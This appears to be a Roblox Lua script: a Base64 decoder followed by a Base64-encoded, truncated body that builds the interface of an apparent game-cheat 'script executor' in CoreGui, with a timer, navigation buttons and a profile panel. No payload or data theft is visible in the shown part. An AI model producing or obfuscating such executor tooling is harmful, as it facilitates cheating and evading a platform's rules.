local function B64Decode(data)
    local B64_CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    local char_to_value = {}
    for i = 1, #B64_CHARS do
        char_to_value[B64_CHARS:sub(i, i)] = i - 1
    end
    
    local output = {}
    local i = 1
    while i <= #data do
        -- Read 4 Base64 chars
        local chunk = data:sub(i, i+3)
        if not chunk or #chunk < 2 then break end -- Stop if not enough data
        i = i + 4

        local c1, c2, c3, c4 = chunk:sub(1, 1), chunk:sub(2, 2), chunk:sub(3, 3), chunk:sub(4, 4)
        
        -- Convert chars to their 6-bit values (0-63)
        local v1, v2 = char_to_value[c1], char_to_value[c2]
        local v3 = char_to_value[c3] or 0
        local v4 = char_to_value[c4] or 0
        
        -- Decode first byte (8 bits)
        output[#output + 1] = string.char((v1 * 4) + (v2 / 16))
        
        -- Decode second byte (if not padded)
        if c3 ~= "=" then
            output[#output + 1] = string.char((v2 % 16 * 16) + (v3 / 4))
        end
        
        -- Decode third byte (if not padded)
        if c4 ~= "=" then
            output[#output + 1] = string.char((v3 % 4 * 64) + v4)
        end
    end
    return table.concat(output)
end

local S = [[LS0gSW5zdGFuY2VzOiAzOTkgfCBTY3JpcHRzOiA3IHwgTW9kdWxlczogMCB8IFRhZ3M6IDEwCmxvY2FsIENvbGxlY3Rpb25TZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJDb2xsZWN0aW9uU2VydmljZSIpOwpsb2NhbCBHMkwgPSB7fTsKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yCkcyTFsiMSJdID0gSW5zdGFuY2UubmV3KCJTY3JlZW5HdWkiKQpHMkxbIjEiXS5OYW1lID0gIkZvdW5kYXRpb25PdmVybGF5IgpHMkxbIjEiXS5JZ25vcmVHdWlJbnNldCA9IHRydWUKRzJMWyIxIl0uU2NyZWVuSW5zZXRzID0gRW51bS5TY3JlZW5JbnNldHMuRGV2aWNlU2FmZUluc2V0cwpHMkxbIjEiXS5aSW5kZXhCZWhhdmlvciA9IEVudW0uWkluZGV4QmVoYXZpb3IuU2libGluZwpHMkxbIjEiXS5SZXNldE9uU3Bhd24gPSBmYWxzZSAKRzJMWyIxIl0uUGFyZW50ID0gZ2FtZTpHZXRTZXJ2aWNlKCJDb3JlR3VpIikKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5UaW1lcgpHMkxbIjIiXSA9IEluc3RhbmNlLm5ldygiRnJhbWUiLCBHMkxbIjEiXSk7CkcyTFsiMiJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiMiJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyIyIl1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCAxNzIsIDAsIDU1KTsKRzJMWyIyIl1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoMC4wMjM5NywgMCwgMC45MTc1OSwgMCk7CkcyTFsiMiJdWyJCb3JkZXJDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbIjIiXVsiTmFtZSJdID0gW1tUaW1lcl1dOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlRpbWVyLkFjY2Vzc1RpbWUKRzJMWyIzIl0gPSBJbnN0YW5jZS5uZXcoIkltYWdlTGFiZWwiLCBHMkxbIjIiXSk7CkcyTFsiMyJdWyJBbmNob3JQb2ludCJdID0gVmVjdG9yMi5uZXcoMCwgMC41KTsKRzJMWyIzIl1bIkltYWdlIl0gPSBbW3JieGFzc2V0aWQ6Ly84NDQ1NDcwOTg0XV07CkcyTFsiMyJdWyJJbWFnZVJlY3RTaXplIl0gPSBWZWN0b3IyLm5ldyg5NiwgOTYpOwpHMkxbIjMiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDQwLCAwLCAzMCk7CkcyTFsiMyJdWyJCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5Il0gPSAxOwpHMkxbIjMiXVsiSW1hZ2VSZWN0T2Zmc2V0Il0gPSBWZWN0b3IyLm5ldyg3MDQsIDkwNCk7CkcyTFsiMyJdWyJOYW1lIl0gPSBbW0FjY2Vzc1RpbWVdXTsKRzJMWyIzIl1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoMC4wNDA3LCAwLCAwLjUsIDApOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlRpbWVyLkFjY2Vzc1RpbWUuVUlBc3BlY3RSYXRpb0NvbnN0cmFpbnQKRzJMWyI0Il0gPSBJbnN0YW5jZS5uZXcoIlVJQXNwZWN0UmF0aW9Db25zdHJhaW50IiwgRzJMWyIzIl0pOwpHMkxbIjQiXVsiRG9taW5hbnRBeGlzIl0gPSBFbnVtLkRvbWluYW50QXhpcy5IZWlnaHQ7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuVGltZXIuRGlzcGxheU5hbWUKRzJMWyI1Il0gPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIsIEcyTFsiMiJdKTsKRzJMWyI1Il1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyI1Il1bIlRleHRTaXplIl0gPSAyNTsKRzJMWyI1Il1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbIjUiXVsiRm9udEZhY2UiXSA9IEZvbnQubmV3KFtbcmJ4YXNzZXQ6Ly9mb250cy9mYW1pbGllcy9Hb3RoYW1TU20uanNvbl1dLCBFbnVtLkZvbnRXZWlnaHQuQm9sZCwgRW51bS5Gb250U3R5bGUuTm9ybWFsKTsKRzJMWyI1Il1bIlRleHRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbIjUiXVsiQmFja2dyb3VuZFRyYW5zcGFyZW5jeSJdID0gMTsKRzJMWyI1Il1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCAxNTEsIDAsIDUwKTsKRzJMWyI1Il1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiNSJdWyJUZXh0Il0gPSBbWzAwOjAwIE0vQV1dOwpHMkxbIjUiXVsiTmFtZSJdID0gW1tEaXNwbGF5TmFtZV1dOwpHMkxbIjUiXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLjExNzIsIDAsIDAuMDMzMywgMCk7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuVGltZXIuVUlDb3JuZXIKRzJMWyI2Il0gPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIiwgRzJMWyIyIl0pOwpHMkxbIjYiXVsiQ29ybmVyUmFkaXVzIl0gPSBVRGltLm5ldygwLCAxNCk7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuVGltZXIuVUlBc3BlY3RSYXRpb0NvbnN0cmFpbnQKRzJMWyI3Il0gPSBJbnN0YW5jZS5uZXcoIlVJQXNwZWN0UmF0aW9Db25zdHJhaW50IiwgRzJMWyIyIl0pOwpHMkxbIjciXVsiQXNwZWN0UmF0aW8iXSA9IDMuMTI3Mjc7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuVGltZXIuVUlTY2FsZQpHMkxbIjgiXSA9IEluc3RhbmNlLm5ldygiVUlTY2FsZSIsIEcyTFsiMiJdKTsKCi0tIEF0dHJpYnV0ZXMKRzJMWyI4Il06U2V0QXR0cmlidXRlKFtbUmVzb2x1dGlvbl1dLCBWZWN0b3IyLm5ldygxOTE5LCAxMDgwKSk7CgotLSBUYWdzCkNvbGxlY3Rpb25TZXJ2aWNlOkFkZFRhZyhHMkxbIjgiXSwgW1tVSVNjYWxlUnVudGltZU9iamVjdF1dKTsKCgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCi0tIPCflZIgUGhpbGlwcGluZSBUaW1lIEZ1bmN0aW9uCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KdGFzay5zcGF3bihmdW5jdGlvbigpCglsb2NhbCB0aW1lTGFiZWwgPSBHMkxbIjUiXQoKCWxvY2FsIGZ1bmN0aW9uIGZvcm1hdFRpbWUoaG91ciwgbWludXRlKQoJCWxvY2FsIHN1ZmZpeCA9ICJBTSIKCQlpZiBob3VyID49IDEyIHRoZW4KCQkJc3VmZml4ID0gIlBNIgoJCWVuZAoJCWlmIGhvdXIgPT0gMCB0aGVuCgkJCWhvdXIgPSAxMgoJCWVsc2VpZiBob3VyID4gMTIgdGhlbgoJCQlob3VyID0gaG91ciAtIDEyCgkJZW5kCgkJcmV0dXJuIHN0cmluZy5mb3JtYXQoIiUwMmQ6JTAyZCAlcyIsIGhvdXIsIG1pbnV0ZSwgc3VmZml4KQoJZW5kCgoJd2hpbGUgdGFzay53YWl0KDEpIGRvCgkJbG9jYWwgdXRjID0gb3MuZGF0ZSgiISp0IikKCQlsb2NhbCBwaEhvdXIgPSAodXRjLmhvdXIgKyA4KSAlIDI0CgkJbG9jYWwgcGhNaW51dGUgPSB1dGMubWluCgkJdGltZUxhYmVsLlRleHQgPSBmb3JtYXRUaW1lKHBoSG91ciwgcGhNaW51dGUpCgllbmQKZW5kKQoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLk5hdmlnYXRvcgpHMkxbIjkiXSA9IEluc3RhbmNlLm5ldygiQ2FudmFzR3JvdXAiLCBHMkxbIjEiXSk7CkcyTFsiOSJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiOSJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyI5Il1bIkFuY2hvclBvaW50Il0gPSBWZWN0b3IyLm5ldygwLjUsIDEpOwpHMkxbIjkiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDMzOSwgMCwgNjMpOwpHMkxbIjkiXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLjUsIDAsIDAuOTgwMDIsIDApOwpHMkxbIjkiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyI5Il1bIk5hbWUiXSA9IFtbTmF2aWdhdG9yXV07CkcyTFsiOSJdWyJCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5Il0gPSAwOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLk5hdmlnYXRvci5VSUNvcm5lcgpHMkxbImEiXSA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBHMkxbIjkiXSk7CkcyTFsiYSJdWyJDb3JuZXJSYWRpdXMiXSA9IFVEaW0ubmV3KDAsIDE0KTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5OYXZpZ2F0b3IuVUlHcmlkTGF5b3V0CkcyTFsiYiJdID0gSW5zdGFuY2UubmV3KCJVSUdyaWRMYXlvdXQiLCBHMkxbIjkiXSk7CkcyTFsiYiJdWyJDZWxsU2l6ZSJdID0gVURpbTIubmV3KDAsIDExMywgMCwgNjMpOwpHMkxbImIiXVsiU29ydE9yZGVyIl0gPSBFbnVtLlNvcnRPcmRlci5MYXlvdXRPcmRlcjsKRzJMWyJiIl1bIkNlbGxQYWRkaW5nIl0gPSBVRGltMi5uZXcoMCwgMCwgMCwgNSk7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuTmF2aWdhdG9yLlVJU2NhbGUKRzJMWyJjIl0gPSBJbnN0YW5jZS5uZXcoIlVJU2NhbGUiLCBHMkxbIjkiXSk7CkcyTFsiYyJdOlNldEF0dHJpYnV0ZShbW1Jlc29sdXRpb25dXSwgVmVjdG9yMi5uZXcoMTkxOSwgMTA4MCkpOwpDb2xsZWN0aW9uU2VydmljZTpBZGRUYWcoRzJMWyJjIl0sIFtbVUlTY2FsZVJ1bnRpbWVPYmplY3RdXSk7CgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5OYXZpZ2F0b3IuSG9tZQpHMkxbImQiXSA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIsIEcyTFsiOSJdKTsKRzJMWyJkIl1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyJkIl1bIlRleHRTaXplIl0gPSAxNDsKRzJMWyJkIl1bIlRleHRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbImQiXVsiQmFja2dyb3VuZENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiZCJdWyJGb250RmFjZSJdID0gRm9udC5uZXcoW1tyYnhhc3NldDovL2ZvbnRzL2ZhbWlsaWVzL1NvdXJjZVNhbnNQcm8uanNvbl1dLCBFbnVtLkZvbnRXZWlnaHQuUmVndWxhciwgRW51bS5Gb250U3R5bGUuTm9ybWFsKTsKRzJMWyJkIl1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCAyMDAsIDAsIDUwKTsKRzJMWyJkIl1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiZCJdWyJUZXh0Il0gPSBbW11dOwpHMkxbImQiXVsiTmFtZSJdID0gW1tIb21lXV07CgpHMkxbImUiXSA9IEluc3RhbmNlLm5ldygiSW1hZ2VMYWJlbCIsIEcyTFsiZCJdKTsKRzJMWyJlIl1bIkFuY2hvclBvaW50Il0gPSBWZWN0b3IyLm5ldygwLjUsIDAuNSk7CkcyTFsiZSJdWyJJbWFnZSJdID0gW1tyYnhhc3NldGlkOi8vODQ0NTQ3MDU1OV1dOwpHMkxbImUiXVsiSW1hZ2VSZWN0U2l6ZSJdID0gVmVjdG9yMi5uZXcoOTYsIDk2KTsKRzJMWyJlIl1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCA0NSwgMCwgNDUpOwpHMkxbImUiXVsiQmFja2dyb3VuZFRyYW5zcGFyZW5jeSJdID0gMTsKRzJMWyJlIl1bIkltYWdlUmVjdE9mZnNldCJdID0gVmVjdG9yMi5uZXcoOTA0LCAyMDQpOwpHMkxbImUiXVsiTmFtZSJdID0gW1tBdXRvUmVuZXddXTsKRzJMWyJlIl1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoMC41LCAwLCAwLjUsIDApOwoKRzJMWyJmIl0gPSBJbnN0YW5jZS5uZXcoIlVJQXNwZWN0UmF0aW9Db25zdHJhaW50IiwgRzJMWyJlIl0pOwpHMkxbImYiXVsiRG9taW5hbnRBeGlzIl0gPSBFbnVtLkRvbWluYW50QXhpcy5IZWlnaHQ7CgpHMkxbIjEwIl0gPSBJbnN0YW5jZS5uZXcoIlVJR3JhZGllbnQiLCBHMkxbImUiXSk7CkcyTFsiMTAiXVsiUm90YXRpb24iXSA9IC05MDsKRzJMWyIxMCJdWyJDb2xvciJdID0gQ29sb3JTZXF1ZW5jZS5uZXd7CglDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuMDAwLCBDb2xvcjMuZnJvbVJHQig1OCwgMCwgMCkpLAoJQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjI2MSwgQ29sb3IzLmZyb21SR0IoODAsIDAsIDApKSwKCUNvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC42MTgsIENvbG9yMy5mcm9tUkdCKDEyMCwgMCwgMCkpLAoJQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjk4OCwgQ29sb3IzLmZyb21SR0IoMTcxLCAwLCAwKSksCglDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDEuMDAwLCBDb2xvcjMuZnJvbVJHQigyNTUsIDAsIDApKQp9OwoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuTmF2aWdhdG9yLlNjcmlwdApHMkxbIjExIl0gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iLCBHMkxbIjkiXSk7CkcyTFsiMTEiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbIjExIl1bIlRleHRTaXplIl0gPSAxNDsKRzJMWyIxMSJdWyJUZXh0Q29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyIxMSJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyIxMSJdWyJGb250RmFjZSJdID0gRm9udC5uZXcoW1tyYnhhc3NldDovL2ZvbnRzL2ZhbWlsaWVzL1NvdXJjZVNhbnNQcm8uanNvbl1dLCBFbnVtLkZvbnRXZWlnaHQuUmVndWxhciwgRW51bS5Gb250U3R5bGUuTm9ybWFsKTsKRzJMWyIxMSJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgMjAwLCAwLCA1MCk7CkcyTFsiMTEiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyIxMSJdWyJUZXh0Il0gPSBbW11dOwpHMkxbIjExIl1bIk5hbWUiXSA9IFtbU2NyaXB0XV07CgpHMkxbIjEyIl0gPSBJbnN0YW5jZS5uZXcoIkltYWdlTGFiZWwiLCBHMkxbIjExIl0pOwpHMkxbIjEyIl1bIkFuY2hvclBvaW50Il0gPSBWZWN0b3IyLm5ldygwLjUsIDAuNSk7CkcyTFsiMTIiXVsiSW1hZ2UiXSA9IFtbcmJ4YXNzZXRpZDovLzg0NDU0NzA1NTldXTsKRzJMWyIxMiJdWyJJbWFnZVJlY3RTaXplIl0gPSBWZWN0b3IyLm5ldyg5NiwgOTYpOwpHMkxbIjEyIl1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCA0NSwgMCwgNDUpOwpHMkxbIjEyIl1bIkJhY2tncm91bmRUcmFuc3BhcmVuY3kiXSA9IDE7CkcyTFsiMTIiXVsiSW1hZ2VSZWN0T2Zmc2V0Il0gPSBWZWN0b3IyLm5ldyg0MDQsIDEwNCk7CkcyTFsiMTIiXVsiTmFtZSJdID0gW1tTY3JpcHRdXTsKRzJMWyIxMiJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAuNSwgMCwgMC41LCAwKTsKCkcyTFsiMTMiXSA9IEluc3RhbmNlLm5ldygiVUlBc3BlY3RSYXRpb0NvbnN0cmFpbnQiLCBHMkxbIjEyIl0pOwpHMkxbIjEzIl1bIkRvbWluYW50QXhpcyJdID0gRW51bS5Eb21pbmFudEF4aXMuSGVpZ2h0OwoKRzJMWyIxNCJdID0gSW5zdGFuY2UubmV3KCJVSUdyYWRpZW50IiwgRzJMWyIxMiJdKTsKRzJMWyIxNCJdWyJSb3RhdGlvbiJdID0gLTkwOwpHMkxbIjE0Il1bIkNvbG9yIl0gPSBHMkxbIjEwIl1bIkNvbG9yIl07CgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5OYXZpZ2F0b3IuU2V0dGluZ3MKRzJMWyIxNSJdID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIiwgRzJMWyI5Il0pOwpHMkxbIjE1Il1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyIxNSJdWyJUZXh0U2l6ZSJdID0gMTQ7CkcyTFsiMTUiXVsiVGV4dENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSk7CkcyTFsiMTUiXVsiQmFja2dyb3VuZENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiMTUiXVsiRm9udEZhY2UiXSA9IEZvbnQubmV3KFtbcmJ4YXNzZXQ6Ly9mb250cy9mYW1pbGllcy9Tb3VyY2VTYW5zUHJvLmpzb25dXSwgRW51bS5Gb250V2VpZ2h0LlJlZ3VsYXIsIEVudW0uRm9udFN0eWxlLk5vcm1hbCk7CkcyTFsiMTUiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDIwMCwgMCwgNTApOwpHMkxbIjE1Il1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiMTUiXVsiVGV4dCJdID0gW1tdXTsKRzJMWyIxNSJdWyJOYW1lIl0gPSBbW1NldHRpbmdzXV07CgpHMkxbIjE2Il0gPSBJbnN0YW5jZS5uZXcoIkltYWdlTGFiZWwiLCBHMkxbIjE1Il0pOwpHMkxbIjE2Il1bIkFuY2hvclBvaW50Il0gPSBWZWN0b3IyLm5ldygwLjUsIDAuNSk7CkcyTFsiMTYiXVsiSW1hZ2UiXSA9IFtbcmJ4YXNzZXRpZDovLzg0NDU0NzEzMzJdXTsKRzJMWyIxNiJdWyJJbWFnZVJlY3RTaXplIl0gPSBWZWN0b3IyLm5ldyg5NiwgOTYpOwpHMkxbIjE2Il1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCA0NSwgMCwgNDUpOwpHMkxbIjE2Il1bIkJhY2tncm91bmRUcmFuc3BhcmVuY3kiXSA9IDE7CkcyTFsiMTYiXVsiSW1hZ2VSZWN0T2Zmc2V0Il0gPSBWZWN0b3IyLm5ldyg2MDQsIDQwNCk7CkcyTFsiMTYiXVsiTmFtZSJdID0gW1tTZXR0aW5nc11dOwpHMkxbIjE2Il1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoMC41LCAwLCAwLjUsIDApOwoKRzJMWyIxNyJdID0gSW5zdGFuY2UubmV3KCJVSUFzcGVjdFJhdGlvQ29uc3RyYWludCIsIEcyTFsiMTYiXSk7CkcyTFsiMTciXVsiRG9taW5hbnRBeGlzIl0gPSBFbnVtLkRvbWluYW50QXhpcy5IZWlnaHQ7CgpHMkxbIjE4Il0gPSBJbnN0YW5jZS5uZXcoIlVJR3JhZGllbnQiLCBHMkxbIjE2Il0pOwpHMkxbIjE4Il1bIlJvdGF0aW9uIl0gPSAtOTA7CkcyTFsiMTgiXVsiQ29sb3IiXSA9IEcyTFsiMTAiXVsiQ29sb3IiXTsKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLk5hdmlnYXRvci5CdXR0b25Hcm91cEVmZmVjdApHMkxbIjE5Il0gPSBJbnN0YW5jZS5uZXcoIkxvY2FsU2NyaXB0IiwgRzJMWyI5Il0pOwpHMkxbIjE5Il1bIk5hbWUiXSA9IFtbQnV0dG9uR3JvdXBFZmZlY3RdXTsKCi0tIEJ1dHRvbiBob3ZlciBmYWRlCkcyTFsiMTkiXS5Tb3VyY2UgPSBbWwoJbG9jYWwgVHdlZW5TZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJUd2VlblNlcnZpY2UiKQoJbG9jYWwgbmF2ID0gc2NyaXB0LlBhcmVudAoJbG9jYWwgYmFzZUNvbG9yID0gQ29sb3IzLmZyb21SR0IoMCwwLDApCglsb2NhbCBob3ZlckNvbG9yID0gQ29sb3IzLmZyb21SR0IoODAsODAsODApCglsb2NhbCB0d2VlblRpbWUgPSAwLjE1CgoJZm9yIF8sYnRuIGluIGlwYWlycyhuYXY6R2V0Q2hpbGRyZW4oKSkgZG8KCQlpZiBidG46SXNBKCJUZXh0QnV0dG9uIikgdGhlbgoJCQlidG4uQXV0b0J1dHRvbkNvbG9yID0gZmFsc2UKCQkJYnRuLkJhY2tncm91bmRDb2xvcjMgPSBiYXNlQ29sb3IKCgkJCWJ0bi5Nb3VzZUVudGVyOkNvbm5lY3QoZnVuY3Rpb24oKQoJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShidG4sIFR3ZWVuSW5mby5uZXcodHdlZW5UaW1lKSwge0JhY2tncm91bmRDb2xvcjMgPSBob3ZlckNvbG9yfSk6UGxheSgpCgkJCWVuZCkKCgkJCWJ0bi5Nb3VzZUxlYXZlOkNvbm5lY3QoZnVuY3Rpb24oKQoJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShidG4sIFR3ZWVuSW5mby5uZXcodHdlZW5UaW1lKSwge0JhY2tncm91bmRDb2xvcjMgPSBiYXNlQ29sb3J9KTpQbGF5KCkKCQkJZW5kKQoJCWVuZAoJZW5kCl1dCgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuSG9tZQpHMkxbIjFhIl0gPSBJbnN0YW5jZS5uZXcoIkZvbGRlciIsIEcyTFsiMSJdKTsKRzJMWyIxYSJdWyJOYW1lIl0gPSBbW0hvbWVdXTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5Ib21lLlBsYXllclByb2ZpbGUKRzJMWyIxYiJdID0gSW5zdGFuY2UubmV3KCJJbWFnZUxhYmVsIiwgRzJMWyIxYSJdKTsKRzJMWyIxYiJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiMWIiXVsiQmFja2dyb3VuZENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSk7CkcyTFsiMWIiXVsiSW1hZ2UiXSA9IFtbcmJ4YXNzZXRpZDovLzk4MzQ0OTQwMzU1MDgzXV07CkcyTFsiMWIiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDM4MiwgMCwgNzA5KTsKRzJMWyIxYiJdWyJCb3JkZXJDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbIjFiIl1bIkJhY2tncm91bmRUcmFuc3BhcmVuY3kiXSA9IDE7CkcyTFsiMWIiXVsiTmFtZSJdID0gW1tQbGF5ZXJQcm9maWxlXV07CkcyTFsiMWIiXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLjAxMzAzLCAwLCAwLjI2MDA4LCAwKTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5Ib21lLlBsYXllclByb2ZpbGUuUHJvZmlsZQpHMkxbIjFjIl0gPSBJbnN0YW5jZS5uZXcoIkZyYW1lIiwgRzJMWyIxYiJdKTsKRzJMWyIxYyJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiMWMiXVsiQmFja2dyb3VuZENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSk7CkcyTFsiMWMiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDI4MywgMCwgMjQ0KTsKRzJMWyIxYyJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAuMTE0MDYsIDAsIDAuMDMxNzksIDApOwpHMkxbIjFjIl1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiMWMiXVsiTmFtZSJdID0gW1tQcm9maWxlXV07CkcyTFsiMWMiXVsiQmFja2dyb3VuZFRyYW5zcGFyZW5jeSJdID0gMTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5Ib21lLlBsYXllclByb2ZpbGUuUHJvZmlsZS5BdmF0YXJJbWFnZQpHMkxbIjFkIl0gPSBJbnN0YW5jZS5uZXcoIkltYWdlTGFiZWwiLCBHMkxbIjFjIl0pOwpHMkxbIjFkIl1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyIxZCJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyIxZCJdWyJJbWFnZSJdID0gW1tyYnhhc3NldDovL3RleHR1cmVzL3VpL0d1aUltYWdlUGxhY2Vob2xkZXIucG5nXV07CkcyTFsiMWQiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDE0MCwgMCwgMTQwKTsKRzJMWyIxZCJdWyJCb3JkZXJDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbIjFkIl1bIk5hbWUiXSA9IFtbQXZhdGFySW1hZ2VdXTsKRzJMWyIxZCJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAuMjU4NjIsIDAsIDAuMDc5NzEsIDApOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLkhvbWUuUGxheWVyUHJvZmlsZS5Qcm9maWxlLkF2YXRhckltYWdlLlVJQ29ybmVyCkcyTFsiMWUiXSA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBHMkxbIjFkIl0pOwpHMkxbIjFlIl1bIkNvcm5lclJhZGl1cyJdID0gVURpbS5uZXcoMCwgMTAwKTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5Ib21lLlBsYXllclByb2ZpbGUuUHJvZmlsZS5EaXNwbGF5TmFtZQpHMkxbIjFmIl0gPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIsIEcyTFsiMWMiXSk7CkcyTFsiMWYiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbIjFmIl1bIlRleHRTaXplIl0gPSAyNTsKRzJMWyIxZiJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyIxZiJdWyJGb250RmFjZSJdID0gRm9udC5uZXcoW1tyYnhhc3NldDovL2ZvbnRzL2ZhbW